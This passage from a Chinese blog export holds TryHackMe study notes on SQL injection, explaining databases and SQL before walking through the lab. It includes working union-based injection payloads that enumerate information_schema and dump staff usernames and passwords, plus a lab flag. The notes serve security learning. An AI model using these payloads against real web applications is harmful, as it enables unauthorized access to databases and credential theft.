/root/3rd.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927143427676.png"
                      alt="image-20220927143427676"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927143605462.png"
                      alt="image-20220927143605462"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927151113944.png"
                      alt="image-20220927151113944"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927151156861.png"
                      alt="image-20220927151156861"
                ></p>
<blockquote>
<p>关于less命令：less命令 的作用与more十分相似，都可以用来浏览文字档案的内容，不同的是less命令允许用户向前或向后浏览文件，而more命令只能向前浏览。</p>
</blockquote>
<h2 id="完整答案"><a href="#完整答案" class="headerlink" title="完整答案"></a>完整答案</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927140953884.png"
                      alt="image-20220927140953884"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-SQL Injection(SQL注入漏洞)-学习</title>
    <url>/2024/01/27/THM-SQL%20Injection(SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/sqlinjectionlm" >https://tryhackme.com/room/sqlinjectionlm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：简单了解如何检测和利用 SQL 注入漏洞。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQL（结构化查询语言）注入，通常称为 SQLi，是对 Web 应用程序数据库服务器的攻击，会导致执行针对数据库的恶意查询。 当 Web 应用程序使用未经验证的用户输入与数据库发生通信时，攻击者就有可能窃取、删除或更改私人和客户的数据，并攻击 Web 应用程序的身份验证方式以访问一些私有信息或客户的私有区域。SQLi 不仅是最古老的 Web 应用程序漏洞之一，而且也是最具破坏性的漏洞之一。</p>
<p>在本文中，你将了解什么是数据库、什么是 SQL 以及一些基本的 SQL 命令、如何检测 SQL 漏洞、如何利用 SQLi 漏洞以及开发人员将如何保护web应用程序免受 SQL 注入攻击影响。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127215911184.png"
                      alt="image-20221127215911184"
                ></p>
<h2 id="什么是数据库？"><a href="#什么是数据库？" class="headerlink" title="什么是数据库？"></a>什么是数据库？</h2><p>如果你之前不曾使用过数据库或利用过它们，你可能需要先了解一些新术语，所以让我们从一些关于数据库的结构和工作方式的基础知识开始。</p>
<p><strong>什么是数据库？</strong></p>
<p>数据库是以有组织的方法通过电子信息的形式存储数据集合的一种方式。 </p>
<p>数据库由 DBMS 控制，DBMS 是数据库管理系统(Database Management System)的字母缩写，DBMS 可分为关系型和非关系型，本文的重点将放在关系型数据库上，你可能遇到的一些常见数据库有 MySQL、Microsoft SQL Server、Access、PostgreSQL 和 SQLite等。 我们将在本小节结束时解释关系型数据库和非关系型数据库之间的区别，但首先，我们应该学习一些基础术语。</p>
<p>在 DBMS 中，你可以有多个数据库，每个数据库都包含自己的一组相关数据。 例如，你可能有一个名为“shop”的数据库，在此数据库中，你希望存储有关可供购买的产品的信息、已注册到你的在线商店的用户信息以及有关你收到的订单信息；你将使用称为表的东西将这些信息单独存储在数据库中，每个表都用唯一的名称标识。 你可以在下图中看到“shop”数据库结构，但是你还可以从下图中看到企业如何使用其他单独的数据库来存储员工信息或销售团队(accounts team)信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127221407347.png"
                      alt="image-20221127221407347"
                ></p>
<p>tips：audit检查、orders订单、payroll工资单</p>
<p><strong>什么是表(table)？</strong></p>
<p>一个表 (table) 由列 (columns) 和行 (rows) 组成，一种有效的理解方式是将表 (table) 想象成一个网格，列从左到右穿过顶部，包含单元格的名称，行则从上到下，每一行都有实际数据。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127222245427.png"
                      alt="image-20221127222245427"
                ></p>
<p><strong>Columns (列) :</strong></p>
<p>每个列，或者称为字段，在每个表都有一个唯一的对应名称。 在创建列时，你还可以设置它将允许包含的数据类型，常见的有整数（数字）、字符串（标准文本）或日期，有些数据库将允许包含更复杂的数据类型，例如地理空间数据（这将包含一些位置信息）。</p>
<p>设置列&#x2F;字段允许的数据类型还可以确保对应的数据库不会存储一些不正确的数据信息，例如字符串“hello world”不能存储在 规定为日期数据类型的列&#x2F;字段中，如果发生这种情况，数据库服务器通常会产生一条报错消息以便进行提醒。</p>
<p>包含整数类型的列&#x2F;字段还可以启用自动递增功能，这能为每一行数据提供一个唯一对应的数字标识，该数字标识会随后续行号增加而增加（即自动递增），这样做会创建所谓的关键字段，关键字段对于每一行数据而言都必须是唯一的，这些关键字段在进行 SQL 查询时可用于查找确切的行。</p>
<p><strong>Rows (行) :</strong></p>
<p>行或记录是包含各个数据行的内容，当你向表中添加数据时，就会创建新的行&#x2F;记录，而当你删除数据时，则会删除对应的行&#x2F;记录。</p>
<p><strong>关系型数据库与非关系型数据库：</strong></p>
<p>关系型数据库会将数据信息存储在表中，并且表和表之间通常可以共享信息，关系型数据库将在具体的表中使用列来指定和定义要存储的数据，并使用行来实际存储数据；这些表通常都会包含具有唯一 ID（主键） 的列，在其他表中也可以使用 ID 来引用主键所对应的列 从而在表之间建立关系，因此这种数据库被称为关系型数据库。</p>
<p>另一方面，被称为 NoSQL 的非关系型数据库是一种不使用表、列和行来存储数据的数据库，这种数据库不需要构建特定的数据库布局，因此每一行数据都可以包含不同的信息，非关系型数据库可以比关系型数据库更具灵活性地存储数据信息。 一些流行的非关系型数据库包括 MongoDB、Cassandra 和 ElasticSearch等。</p>
<p>现在你已经了解了数据库是什么，让我们继续了解如何使用 SQL 与数据库进行实际对话。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127225454331.png"
                      alt="image-20221127225454331"
                ></p>
<h2 id="什么是SQL？"><a href="#什么是SQL？" class="headerlink" title="什么是SQL？"></a>什么是SQL？</h2><p>SQL（结构化查询语言）是一种用于查询数据库的功能丰富的语言，具体的 SQL 查询通常被称为 SQL 语句。</p>
<p>我们将在此小节中介绍一些最简单的SQL命令，主要用于检索（选择-select）、更新(update)、插入(insert)和删除(delete)数据；尽管存在相似之处，但是不同的数据库服务器都有属于自己的SQL语法并且在工作方式上也会有一些细微的变化。 </p>
<p>接下来的示例都将基于 MySQL 数据库，通过在线搜索你可以很轻松地找到不同数据库服务器所对应的替代语法，值得注意的是，在SQL 语法中并不会区分大小写字母。</p>
<p><strong>SELECT</strong></p>
<p>我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。</p>
<blockquote>
<p>select * from users;</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127231128717.png"
                      alt="image-20221127231128717"
                ></p>
<p>第一个单词 <code>SELECT</code> 告诉数据库我们想要检索一些数据；<code>*</code> 告诉数据库我们想要从表中接收所有列信息，例如，该表可能包含三列（id、username和password）；<code>from users</code>告诉数据库我们要从名为<code>users</code>的表中检索数据；最后，末尾的分号<code>;</code>告诉数据库 查询语句到此结束。</p>
<p>下一条查询语句与上面的类似，但是我们不再使用 <code>*</code> 返回数据库表中的所有列信息，而是只请求username和password字段(列)。</p>
<blockquote>
<p>select username,password from users;</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127231641123.png"
                      alt="image-20221127231641123"
                ></p>
<p>接下来的查询语句将使用<code>*</code>选择器返回所有列信息，然后再使用<code>LIMIT 1</code>子句强制数据库仅返回一行数据；将查询子句更改为<code>LIMIT 1,1</code>会强制查询语句跳过第一个查询结果，使用子句<code>LIMIT 2,1</code>会跳过前两个查询结果，依此类推，你只需要记住上述查询子句的第一个数字会告诉数据库你希望跳过多少个查询结果，而第二个数字会告诉数据库需要返回多少行数据。</p>
<blockquote>
<p>select * from users LIMIT 1;</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127232222155.png"
                      alt="image-20221127232222155"
                ></p>
<p>接下来，我们将使用 <code>where</code> 子句，我们可以通过返回与我们的特定子句相匹配的数据来挑选出我们所需要的确切目标数据：</p>
<blockquote>
<p>select * from users where username&#x3D;’admin’;</p>
<p>使用以上查询语句，将只返回用户名等于 admin 的行。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127232628219.png"
                      alt="image-20221127232628219"
                ></p>
<blockquote>
<p>select * from users where username !&#x3D; ‘admin’;</p>
<p>使用以上查询语句，将只返回用户名不等于 admin 的行。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127232927564.png"
                      alt="image-20221127232927564"
                ></p>
<blockquote>
<p>select * from users where username&#x3D;’admin’ or username&#x3D;’jon’;</p>
<p>使用以上查询语句，将只返回用户名等于 admin 或 jon 的行。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127233028260.png"
                      alt="image-20221127233028260"
                ></p>
<blockquote>
<p>select * from users where username&#x3D;’admin’ and password&#x3D;’p4ssword’;</p>
<p>使用以上查询语句，将只返回用户名等于 admin 且密码等于 p4ssword 的行。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127233124985.png"
                      alt="image-20221127233124985"
                ></p>
<p>使用<code>like</code>子句可以对目标数据进行不完全匹配查询，我们可以通过选择百分号<code>%</code>所表示的通配符的具体放置位置 来指定包含某些字符、以某些字符作为开头或者以某些字符作为结尾的目标数据。</p>
<blockquote>
<p>select * from users where username like ‘a%’;</p>
<p>这将返回username字段中以字母 a 开头的所有行。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127233954838.png"
                      alt="image-20221127233954838"
                ></p>
<blockquote>
<p>select * from users where username like ‘%n’;</p>
<p>这将返回username字段中以字母 n 结尾的任何行。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127234126510.png"
                      alt="image-20221127234126510"
                ></p>
<blockquote>
<p>select * from users where username like ‘%mi%’;</p>
<p>这将返回用户名中包含字符 mi 的任何行。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221127234215742.png"
                      alt="image-20221127234215742"
                ></p>
<p><strong>UNION</strong></p>
<p>UNION 语句将组合两个或多个 SELECT 语句的结果以从单个或多个表中检索数据； 在进行<em><strong>多表查询</strong></em>时，此查询的规则是 UNION 语句必须在每个 SELECT 语句中<em><strong>检索相同数量的列</strong></em>，这些<em><strong>列必须具有相似的数据类型并且列顺序必须相同</strong></em>。 这听起来可能不是很清楚，所以让我们使用以下例子类比：假设一家公司想要为所有客户和供应商创建一个地址列表以邮寄新商品目录，我们有一个名为 customers 的表，其中包含以下内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128164235825.png"
                      alt="image-20221128164235825"
                ></p>
<p>还有另一个表为供应商表(suppliers )，内容如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128164359786.png"
                      alt="image-20221128164359786"
                ></p>
<p>使用下面的 SQL 语句，我们可以从上面的两个表中收集查询结果并将它们放入一个结果集合中（最终合并的列名，由第一条SELECT语句的查询结果决定）：</p>
<blockquote>
<p>SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128165005052.png"
                      alt="image-20221128165005052"
                ></p>
<p><strong>INSERT</strong></p>
<p>INSERT 语句将告诉数据库我们希望向表中插入一行新数据。 <code>into users</code>告诉数据库我们希望将数据插入哪个表，<code>(username,password)</code>将指明我们需要为其提供新数据的列&#x2F;字段属性，然后是<code>values (&#39;bob&#39;,&#39;password123&#39;);</code>将为先前指定的列提供一行新数据。</p>
<blockquote>
<p>insert into users (username,password) values (‘bob’,’password123’);</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128170348124.png"
                      alt="image-20221128170348124"
                ></p>
<p><strong>UPDATE</strong></p>
<p>UPDATE 语句将告诉数据库我们希望更新表中的一行或多行数据。你可以使用<code>update %tablename% SET</code>来指定要更新的表，然后选择你想要更新的一个或多个字段(此处需要指明列&#x2F;字段的具体值)并用逗号分隔清单，例如<code>username=&#39;root&#39;,password=&#39;pass123&#39;</code>，最后与 SELECT 语句类似，你还可以使用 where 子句来准确指定你要更新的行，例如<code>where username=&#39;admin&#39;;</code></p>
<blockquote>
<p>update users SET username&#x3D;’root’,password&#x3D;’pass123’ where username&#x3D;’admin’;</p>
<p>更新之前为：2 admin p4ssword</p>
<p>更新之后为：2 root     pass123</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128171317761.png"
                      alt="image-20221128171317761"
                ></p>
<p><strong>DELETE</strong></p>
<p>DELETE 语句将告诉数据库我们希望删除一行或多行数据。 除了缺少你希望返回的列之外，此查询的格式与 SELECT语句 非常相似，在此处可以使用 where 子句来精确指定你想要删除的数据，并可使用 LIMIT 子句来指定要删除的行数。</p>
<blockquote>
<p>delete from users where username&#x3D;’martin’;</p>
<p>被删除的数据：3 martin secret123</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128171940837.png"
                      alt="image-20221128171940837"
                ></p>
<blockquote>
<p>delete from users;</p>
<p>如果查询语句中没有使用 WHERE 子句，那么表中的所有数据都会被删除。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128172202494.png"
                      alt="image-20221128172202494"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128172309923.png"
                      alt="image-20221128172309923"
                ></p>
<h2 id="什么是SQL注入漏洞？"><a href="#什么是SQL注入漏洞？" class="headerlink" title="什么是SQL注入漏洞？"></a>什么是SQL注入漏洞？</h2><p><strong>什么是SQL注入？</strong></p>
<p>当用户提供的数据能够被包含在 SQL 查询语句中时，使用 SQL 的 Web 应用程序就会受到 SQL 注入攻击影响。</p>
<p><strong>SQL注入是什么样子的？</strong></p>
<p>假设你访问一个在线博客网站，该网站上的每个博客条目都有一个唯一的 ID 号相对应，博客条目可以设置为公开或私有，具体取决于它们是否准备好公开发布。</p>
<p>每个博客条目的 URL 可能如下所示：</p>
<blockquote>
<p><a class="link"   href="https://website.thm/blog?id=1" >https://website.thm/blog?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>从上面的 URL 中，你可以看到所选择的博客条目ID来自于查询字符串中的 id 参数，当该Web 应用程序需要从数据库中检索对应的博客文章时，则可能会使用如下所示的 SQL 语句：</p>
<blockquote>
<p>SELECT * from blog where id&#x3D;1 and private&#x3D;0 LIMIT 1;</p>
</blockquote>
<p>根据你在上一个小节中学到的知识，你应该能够得知上面的 SQL 语句的作用是 在 blog 表中查找 id 号为 1 且private列属性被设置为 0 (这意味着它能够供公众查看)的博客文章，最后的查询结果被限制为只有一个匹配项。</p>
<p>正如本小节开始时所提到的，当用户的输入被引入到数据库查询语句中时，就会发生 SQL 注入。 在此实例中，你可以发现 URL 查询字符串中的 id 参数被直接用于 SQL 查询语句中。</p>
<p>假设文章 id 2 被锁定为私有，因此我们无法在网站上直接查看该文章，我们现在可以尝试修改 URL ：</p>
<blockquote>
<p><a class="link"   href="https://website.thm/blog?id=2;--" >https://website.thm/blog?id=2;-- <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>然后对应的 SQL 语句如下：</p>
<blockquote>
<p>SELECT * from blog where id&#x3D;2;– and private&#x3D;1 LIMIT 1;</p>
</blockquote>
<p>URL <strong><a class="link"   href="https://website.thm/blog?id=2;--" >https://website.thm/blog?id=2;-- <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong>  中的分号表示 SQL 语句的结束，两个短横线符号则会导致其后面的所有内容都被视为注释（这里的分号和短横线都为英文字符）。</p>
<p>通过这样处理，实际上在运行的SQL查询为：</p>
<blockquote>
<p>SELECT * from blog where id&#x3D;2;–</p>
</blockquote>
<p>以上查询语句将返回 id 为 2 的博客文章，无论它是否设置为公开权限。</p>
<p>以上示例是一种被称为带内 SQL 注入的 SQL 注入漏洞类型；基础的SQL注入类型有 In-Band, Blind 和 Out Of Band ，我们将在接下来的知识点小节中进行讨论。</p>
<p>tips：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何判断是否存在SQL注入：</span><br><span class="line">在URL或者一个提交表单中输入一个英文单引号或者其他特殊符号，如果页面出现错误说明此页面存在SQL注入，如果页面正常显示说明可能有字符被过滤了或者不存在注入。</span><br><span class="line"></span><br><span class="line">SQL注入的具体类别：</span><br><span class="line">事实上SQL注入有很多种，按数据类型可以分为数字型、字符型和搜索型，按提交方式可分为GET型，POST型，Cookie型和HTTP请求头注入，按执行效果有可以分为报错注入、联合查询注入、盲注和堆查询注入，其中盲注又可分为基于bool的盲注和基于时间的盲注。</span><br><span class="line"></span><br><span class="line">搜索型注入查询语句为：SELECT * FROM user WHERE search like &#x27;%1%&#x27;</span><br><span class="line">搜索型注入也可分为POST型和GET型,GET型一般是用于实现网站上的搜索功能,而POST型则是用在用户登录处,可以从form表单的method=&quot; &quot;属性来区分是GET型还是POST型。</span><br><span class="line">搜索型注入又被称为文本框注入。</span><br></pre></td></tr></table></figure></div>

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128175042652.png"
                      alt="image-20221128175042652"
                ></p>
<p>tips：分号(英文符号)表示SQL语句段的结束。</p>
<h2 id="带内SQLi（SQL-injection）"><a href="#带内SQLi（SQL-injection）" class="headerlink" title="带内SQLi（SQL injection）"></a>带内SQLi（SQL injection）</h2><p><strong>带内(In-Band) SQL 注入</strong></p>
<p>带内 SQL 注入是最容易检测和利用的SQL注入类型；In-Band 是指使用相同的通信方法来利用漏洞以及接收攻击结果，例如，在网站某一页面上发现了 SQL 注入漏洞，然后能够从数据库中提取数据到发现注入点的同一页面。</p>
<p><strong>基于报错(Error-Based)的 SQL 注入</strong></p>
<p>这种类型的 SQL 注入对于轻松获取有关数据库结构的信息最有用，因为来自数据库的错误消息会直接打印到浏览器屏幕，这通常可用于枚举整个数据库。</p>
<p><strong>基于联合(Union-Based)的 SQL 注入</strong></p>
<p>这种类型的SQL注入会利用 UNION 运算符和 SELECT 语句将其他结果返回到发现注入点的页面，此方法是通过 SQL 注入漏洞获取大量数据的最常用方法。联合查询相当于把别的表的数据查询结果显示到当前表，使用联合查询时，必须使得两张表的表结构一致，因此我们需要判断当前表的列数有多少列。</p>
<p>联合型注入发生的前提条件：要有显示位，在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端则会将数据展示在某个页面中，这个展示数据的位置就叫显示位。</p>
<p>注：加号<code>+</code>在URL中有特殊含义，所以当我们在URL中使用的SQL注入payload包含了加号，那么就需要对其进行URL编码，经过URL编码的加号为<code>%2b</code>。</p>
<p><strong>Practical:</strong></p>
<p>在TryHackMe相关实验房间中，单击绿色的“启动机器”按钮以使用 SQL 注入示例练习实验室（<em><strong>这个SQL注入实验室在接下来的几个知识点小节中也会用到</strong></em>）；每个实验级别都包含一个模拟浏览器以及 SQL 查询框和报错框，以帮助你获得 查询&#x2F;有效载荷 的最终结果。</p>
<p>注：在进行SQL注入时，可以直接在URL中提交注入语句，此时需要将SQL语句中的注释符<code>#</code>进行URL编码(或者使用<code>--</code>进行注释)，有时候整个SQL注入语句都需要经过URL编码处理。</p>
<p>SQL注入实验的第一关包含一个模拟浏览器和一个网站，该网站是一个在线博客网站，你可以通过更改 URL 查询字符串中的 ID 号来访问不同的博客文章网页。</p>
<p>发现基于报错的 SQL 注入的关键是通过尝试某些字符来破坏代码的 SQL 查询，直到产生错误消息； 最常见的是使用英文单引号 (<code>&#39;</code>) 或英文双引号 (<code>&quot;</code>)。</p>
<p>我们可以尝试在URL中的 id&#x3D;1 后键入英文单引号 (<code>&#39;</code>)，然后按下 Enter 键，如果你看到当前页面返回一个 SQL查询 报错，以通知你所使用的SQL语法中存在错误，那么基于收到报错消息这一事实，你已经成功验证了当前网站页面存在SQL 注入漏洞；我们可以进一步利用此注入漏洞并通过报错消息来了解有关数据库结构的更多信息。</p>
<p>我们接下来需要尝试将数据库中的数据返回给浏览器页面而不是简单地显示一些错误消息。 首先，我们将使用 UNION 运算符，以便我们可以接收到我们所查询到的一些额外结果，尝试将模拟浏览器URL中的 id 参数设置为：</p>
<blockquote>
<p>1 UNION SELECT 1</p>
</blockquote>
<p>以上语句会产生一条错误消息，通知我们 UNION SELECT 语句的列数与原始 SELECT 查询的列数不同；因此，我们可以添加列数并再试一次：</p>
<blockquote>
<p>1 UNION SELECT 1,2</p>
</blockquote>
<p>以上语句又产生了和之前同样的错误，所以我们再添加一列进行尝试：</p>
<blockquote>
<p>1 UNION SELECT 1,2,3</p>
</blockquote>
<p>以上语句执行成功，我们可以发现报错消息消失了，当前页面将显示id为 1 的文章，但是我们想显示数据库中的数据而不是显示文章内容。此处会显示文章内容是因为查询语句在网站代码的某处获取到了第一个返回结果并将该结果显示在当前网页页面；为了解决这个问题，我们需要让第一条查询语句不产生任何结果，这可以简单地通过将文章 ID 从 1 更改为 0 来完成。</p>
<blockquote>
<p>0 UNION SELECT 1,2,3</p>
</blockquote>
<p>你现在将看到浏览器当前页面内容仅由UNION select的结果组成即只返回列值(value) 1、2 和 3 ；我们可以使用这些返回值来检索更有用的信息，首先，我们将获取我们有权访问的数据库名称：</p>
<blockquote>
<p>0 UNION SELECT 1,2,database()</p>
</blockquote>
<p>使用以上语句，你将看到之前显示数字 3 的位置 现在将显示目标数据库的名称，即 <em><strong>sqli_one</strong></em> 。</p>
<p>我们的下一个查询将收集该数据库中的所有表(table)信息。</p>
<blockquote>
<p>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_one’</p>
</blockquote>
<p>在此查询中有一些新东西需要学习：首先，<code>group_concat()</code> 方法能够从多个返回的行中获取指定的列（在我们的例子中为 <code>table_name</code> 列&#x2F;字段），并将其放入一个以逗号分隔的字符串中；接下来是 <code>information_schema</code> 信息数据库，目标数据库的每个用户都可以访问这个信息数据库，该信息数据库将包含有关用户有权访问的所有数据库和表的信息。 在这个特定的查询中，我们可以列出 <em><strong>sqli_one</strong></em> 数据库中的所有表，即 <em><strong>article</strong></em> 表和 <em><strong>staff_users</strong></em> 表 。</p>
<p>由于此SQL注入实验第一关旨在发现 Martin 的密码，因此我们对 <em><strong>staff_users</strong></em> 表感兴趣，我们可以再次利用<code>information_schema</code>信息数据库，使用以下查询找到该表的结构：</p>
<blockquote>
<p>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name &#x3D; ‘staff_users’</p>
</blockquote>
<p>上面这条查询类似于前面用于查找表名的 SQL 查询，但是，在此处我们要检索的信息已从之前的 <code>table_name</code>字段 更改为 <code>column_name</code>字段，并且我们在信息数据库<code>information_schema</code>中要查询的信息表从tables (表) 更改为columns (列) 。最后我们接着搜索 <code>table_name</code> 列的值为<code>staff_users</code>的所有行。(结合group_concat之后，此处从信息数据库中查询到的是关于数据库所有列名的信息，最后再结合where子句筛选出staff_users表中的所有列名)</p>
<p>由查询结果可知 <em><strong>staff_users</strong></em> 表有三列：id、password 和 username。 我们可以使用包含username和password 列(字段)的查询语句来检索用户信息。</p>
<p><code>0 UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password SEPARATOR &#39;&lt;br&gt;&#39;) FROM staff_users</code></p>
<p>我们再次使用 <code>group_concat</code> 方法将所有行信息都返回到一个字符串中，我们添加了 <code>,&#39;:&#39;,</code>来将用户名信息和密码信息彼此分开，我们在此处没有用逗号分隔，而是选择了 HTML中的 <code>&lt;br&gt;</code> 标记来作为分隔符号，它将强制每个查询结果都位于单独的一行上，以便于我们查看最终的SQL注入查询结果。</p>
<p>我们现在可以访问到 Martin 的密码信息并能进入下一级别的SQL注入关卡（这将在下一小节中进行操作介绍）。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128205440630.png"
                      alt="image-20221128205440630"
                ></p>
<p>启动实验环境：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128212444010.png"
                      alt="image-20221128212444010"
                ></p>
<p>加英文单引号：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128212632382.png"
                      alt="image-20221128212632382"
                ></p>
<p>上图报错信息所对应的中文翻译：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128212703433.png"
                      alt="image-20221128212703433"
                ></p>
<p>猜解原始 SELECT 查询的列数：</p>
<blockquote>
<p>1 UNION SELECT 1</p>
<p>1 UNION SELECT 1,2</p>
<p>1 UNION SELECT 1,2,3</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128213019232.png"
                      alt="image-20221128213019232"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128213219892.png"
                      alt="image-20221128213219892"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128213504181.png"
                      alt="image-20221128213504181"
                ></p>
<p>让原始select查询不产生任何结果，将id &#x3D; 1 改为id &#x3D; 0 即可：</p>
<blockquote>
<p>0 UNION SELECT 1,2,3</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128213839173.png"
                      alt="image-20221128213839173"
                ></p>
<p>查询目标数据库的名称：</p>
<blockquote>
<p>0 UNION SELECT 1,2,database()</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128214036015.png"
                      alt="image-20221128214036015"
                ></p>
<p>查询目标数据库包含的表名：</p>
<blockquote>
<p>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_one’</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128214152838.png"
                      alt="image-20221128214152838"
                ></p>
<p>查询<em><strong>staff_users</strong></em> 表中的列名：</p>
<blockquote>
<p>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name &#x3D; ‘staff_users’</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128214421024.png"
                      alt="image-20221128214421024"
                ></p>
<p>检索 <em><strong>staff_users</strong></em> 表中的用户信息：</p>
<p><code>0 UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password SEPARATOR &#39;&lt;br&gt;&#39;) FROM staff_users</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128214818214.png"
                      alt="image-20221128214818214"
                ></p>
<p>获取实验关卡一的flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128215008013.png"
                      alt="image-20221128215008013"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221128215115677.png"
                      alt="image-20221128215115677"
                ></p>
<blockquote>
<p>THM{SQL_INJECTION_3840}</p>
</blockquote>
<h2 id="SQL盲注—身份认证绕过"><a href="#SQL盲注—身份认证绕过" class="headerlink" title="SQL盲注—身份认证绕过"></a>SQL盲注—身份认证绕过</h2><p><strong>Blind SQLi (盲注类型的SQL注入)</strong></p>
<p>与我们可以直接在屏幕上看到攻击结果的带内 SQL 注入不同，盲注类型的 SQLi 是指我们几乎没有或根本没有反馈信息来确认我们所注入的SQL查询是否成功，这是因为错误消息已被禁用，但实际上注入攻击可能仍然有效，只是无法直接在页面上看到SQL注入结果。在盲注类型的SQL注入攻击中，我们所需要的只是成功枚举整个数据库之后的一点点反馈信息。</p>
<p><strong>Authentication Bypass (身份认证绕过)</strong></p>
<p>最直接的 SQL 盲注技巧是绕过登录表单等身份验证方法进行SQL注入，在这种情况下，我们对从数据库中检索数据并不感兴趣，我们只是想通过SQL注入来实现登录成功的操作。  </p>
<p>连接到用户数据库的登录表单通常以这样一种方式开发，即 Web 应用程序对用户名和密码的内容其实并不感兴趣，更多的是关注这两者所对应的数据是否 在数据库的用户表中能够得到匹配；简而言之，Web 应用程序将询问其对应的数据库“你是否有用户名为 bob 且密码为 bob123 的用户？”等类似问题，而数据库则负责回答yes或no（真true&#x2F;假false），该答案将决定 Web 应用程序是否允许你通过登录验证并实现登录成功操作。</p>
